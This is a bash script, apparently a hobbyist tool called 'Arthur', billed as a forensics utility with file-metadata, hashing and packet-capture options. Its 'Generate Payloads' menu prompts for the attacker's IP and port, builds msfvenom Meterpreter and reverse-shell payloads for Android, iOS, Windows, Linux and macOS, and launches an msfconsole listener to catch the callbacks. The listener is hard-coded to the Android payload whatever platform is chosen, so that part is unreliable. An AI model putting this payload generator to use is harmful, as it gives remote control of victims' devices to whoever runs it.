#!/bin/bash


#developed by eliot_550
# This code has a lots of choices if you are not suitable with any choice
# Function to display an awesome logo for Arthur
show_logo() {
    echo -e "\033[1;32m"
    echo "      _____ _     _           _       "
    echo "     |  __ \ |   (_)         | |      "
    echo "     | |  | | ___ _ _ __   __| |_ ___ "
    echo "     | |  | |/ _ \ | '_ \ / _\` | / __|"
    echo "     | |__| |  __/ | | | | (_| | \__ \ "
    echo "     |_____/ \___|_|_| |_|\__,_|_|___/ "
    echo "                                   "
    echo -e "\033[0m"
}

# Function to display a cool greeting
show_greeting() {
    echo -e "\033[1;36mWelcome to Arthur by eliot_550\033[0m"
    echo -e "\033[1;33mYour ultimate terminal tool for forensics!\033[0m"
    echo ""
}

# In the main menu, add the option to generate payloads
show_main_menu() {
    echo -e "\033[1;34mPlease choose an option:\033[0m"
    echo -e "\033[1;32m1. Files Digital Forensics\033[0m"
    echo -e "\033[1;32m2. Network Digital Forensics\033[0m"
    echo -e "\033[1;32m3. Generate Payloads\033[0m"
    echo -e "\033[1;32m4. Exit\033[0m"
}



# Function to generate a payload for mobile or desktop
generate_payload() {
    echo -e "\033[1;36mChoose platform for payload generation:\033[0m"
    echo -e "\033[1;32m1. Android\033[0m"
    echo -e "\033[1;32m2. iOS\033[0m"
    echo -e "\033[1;32m3. Windows\033[0m"
    echo -e "\033[1;32m4. Linux\033[0m"
    echo -e "\033[1;32m5. macOS\033[0m"
    echo -e "\033[1;32m6. Go Back\033[0m"
    
    read -p "Enter your choice (1-6): " payload_choice

    echo -e "\033[1;36mEnter your IP address (attacker's machine):\033[0m"
    read -p "IP: " ip_address
    echo -e "\033[1;36mEnter your desired port (default 4444):\033[0m"
    read -p "Port: " port
    port=${port:-4444}  # Default port is 4444 if none is provided

    case $payload_choice in
        1)
            # Generate Android Payload
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port -o android_payload.apk
            echo -e "\033[1;32mAndroid payload generated as android_payload.apk\033[0m"
            ;;
        2)
            # Generate iOS Payload
            msfvenom -p ios/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port -o ios_payload.dmg
            echo -e "\033[1;32miOS payload generated as ios_payload.dmg\033[0m"
            ;;
        3)
            # Generate Windows Payload
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port -f exe -o windows_payload.exe
            echo -e "\033[1;32mWindows payload generated as windows_payload.exe\033[0m"
            ;;
        4)
            # Generate Linux Payload
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port -f elf -o linux_payload.elf
            echo -e "\033[1;32mLinux payload generated as linux_payload.elf\033[0m"
            ;;
        5)
            # Generate macOS Payload
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip_address LPORT=$port -f macho -o macos_payload.macho
            echo -e "\033[1;32mmacOS payload generated as macos_payload.macho\033[0m"
            ;;
        6)
            # Go back to the previous menu
            return
            ;;
        *)
            echo -e "\033[1;31mInvalid option. Please choose between 1 and 6.\033[0m"
            ;;
    esac

    # Start the reverse shell listener
    echo -e "\033[1;36mStarting the reverse shell listener on port $port...\033[0m"
    msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $ip_address; set LPORT $port; exploit"
}

# Function to show the files digital forensics submenu
show_files_digital_forensics_menu() {
    echo -e "\033[1;34mFiles Digital Forensics - Please choose an option:\033[0m"
    echo -e "\033[1;32m1. Extract File Metadata\033[0m"
    echo -e "\033[1;32m2. Check File Integrity (Hashing)\033[0m"
    echo -e "\033[1;32m3. Go Back to Main Menu\033[0m"
}

# Function to extract file metadata
extract_metadata() {
    echo -e "\033[1;36mEnter the file path:\033[0m"
    read -p "Path: " file_path
    if [[ -f "$file_path" ]]; then
        echo -e "\033[1;32mFile Metadata for $file_path:\033[0m"
        echo -e "File Size: $(stat --format=%s "$file_path") bytes"
        echo -e "Creation Time: $(stat --format=%W "$file_path")"
        echo -e "Last Modified Time: $(stat --format=%y "$file_path")"
        echo -e "Last Access Time: $(stat --format=%x "$file_path")"
        echo -e "File Permissions: $(stat --format=%A "$file_path")"
    else
        echo -e "\033[1;31mFile does not exist.\033[0m"
    fi
}

# Function to calculate SHA-256 hash of a file
calculate_hash() {
    echo -e "\033[1;36mEnter the file path:\033[0m"
    read -p "Path: " file_path
    if [[ -f "$file_path" ]]; then
        sha256sum "$file_path"
    else
        echo -e "\033[1;31mFile does not exist.\033[0m"
    fi
}

# Function to show the network digital forensics submenu
show_network_digital_forensics_menu() {
    echo -e "\033[1;34mNetwork Digital Forensics - Please choose an option:\033[0m"
    echo -e "\033[1;32m1. Capture Network Packets\033[0m"
    echo -e "\033[1;32m2. Analyze Network Traffic\033[0m"
    echo -e "\033[1;32m3. Go Back to Main Menu\033[0m"
}
# Function to capture network packets using tcpdump (or Bettercap)
capture_network_packets() {
    echo -e "\033[1;36mCapturing network packets...\033[0m"
    
    # Using tcpdump to capture packets on eth0 interface (you can change the interface name based on your setup)
    sudo tcpdump -i eth0 -w captured_packets.pcap
    # Alternatively, you can use Bettercap:
    # sudo bettercap -iface eth0 -caplet capture.cap
}

# Function to analyze network traffic using tcpdump (or Bettercap)
analyze_network_traffic() {
    echo -e "\033[1;36mAnalyzing network traffic...\033[0m"
    
    # You can use tcpdump to analyze packets in real-time, showing only IP packets
    sudo tcpdump -nn -i eth0 ip
    # Or use Bettercap for traffic analysis:
    # sudo bettercap -iface eth0 -eval 'net.probe on'
}

# To run the functions, simply call them:
# capture_network_packets
# analyze_network_traffic


# Main program loop
while true; do
    show_logo
    show_greeting
    show_main_menu

    echo -e "\033[1;36mEnter your choice (1-4):\033[0m"
    read main_choice

    case $main_choice in
        1)
            # Files Digital Forensics submenu
            while true; do
                show_files_digital_forensics_menu
                echo -e "\033[1;36mEnter your choice (1-3):\033[0m"
                read files_choice

                case $files_choice in
                    1)
                        extract_metadata
                        ;;
                    2)
                        calculate_hash
                        ;;
                    3)
                        break
                        ;;
                    *)
                        echo -e "\033[1;31mInvalid option. Please choose between 1 and 3.\033[0m"
                        ;;
                esac
            done
            ;;
        2)
            # Network Digital Forensics submenu
            while true; do
                show_network_digital_forensics_menu
                echo -e "\033[1;36mEnter your choice (1-3):\033[0m"
                read network_choice

                case $network_choice in
                    1)
                        capture_network_packets
                        ;;
                    2)
                        analyze_network_traffic
                        ;;
                    3)
                        break
                        ;;
                    *)
                        echo -e "\033[1;31mInvalid option. Please choose between 1 and 3.\033[0m"
                        ;;
                esac
            done
            ;;
        3)
            # Generate Payloads submenu
            generate_payload
            ;;
        4)
            echo -e "\033[1;31mExiting Arthur...\033[0m"
            exit 0
            ;;
        *)
            echo -e "\033[1;31mInvalid option. Please choose between 1 and 4.\033[0m"
            ;;
    esac
done
